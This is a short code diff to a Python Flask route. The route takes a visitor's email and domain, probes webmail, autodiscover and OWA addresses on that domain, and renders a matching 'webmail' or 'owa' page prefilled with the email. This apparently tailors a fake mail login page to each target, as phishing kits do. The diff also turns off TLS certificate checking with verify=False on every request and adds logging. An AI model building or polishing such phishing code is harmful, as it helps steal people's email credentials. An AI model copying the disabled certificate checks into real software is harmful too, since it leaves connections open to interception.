@@ -142,24 +142,27 @@ def route2():
     autodiscover_url = f"http://autodiscover.{user_domain}/owa/#path=/mail/search"
     owa_url = f"http://owa.{user_domain}/owa/#path=/mail"
 
-    # Check webmail URL
     try:
-        response_webmail = requests.get(webmail_url)
+        # Check webmail URL
+        response_webmail = requests.get(webmail_url, verify=False)  # Added verify=False to ignore SSL warnings
         if response_webmail.status_code == 200:
             return render_template('webmail.html', eman=web_param, dman=user_domain)
-    except requests.RequestException:
-        pass
 
-    # Check autodiscover URL and owa URL
-    try:
-        response_autodiscover = requests.get(autodiscover_url)
-        response_owa = requests.get(owa_url)
-        
+        # Check autodiscover URL and owa URL
+        response_autodiscover = requests.get(autodiscover_url, verify=False)
+        response_owa = requests.get(owa_url, verify=False)
+
         if response_autodiscover.status_code == 200 or response_owa.status_code == 200:
             return render_template('owa.html', dman=user_domain)
-    except requests.RequestException:
-        pass
 
+    except requests.RequestException as e:
+        # Log the exception for debugging
+        logging.error(f"Error during request: {e}")
+
+    # Log that we reached this point
+    logging.warning("No matching URL found")
+
+    # If no matching URL found, return a default template
     return render_template('index.html', eman=web_param, ins=user_domain)
 
 
